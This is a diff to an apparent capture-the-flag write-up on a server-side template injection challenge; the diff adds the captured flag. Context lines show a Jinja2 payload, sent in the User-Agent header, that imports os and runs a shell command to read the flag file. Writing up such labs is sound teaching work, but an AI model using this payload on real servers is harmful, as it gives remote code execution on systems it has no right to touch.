@@ -8,5 +8,7 @@ So this problem is basically a SSTI (Server Side Template Injection) problem whe
 so writing ```{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag/flag.txt').read()}} ``` in the user-agent header, you should get something like this:
 ![osdetectflag](https://github.com/user-attachments/assets/2fb6fe07-d93c-4b6f-860b-f6c67eab793e)
 
+flag: ```PP{h4ck3r-OS-d3t3ct3d::_8pKiuAOG5PM} ```
+
 
 
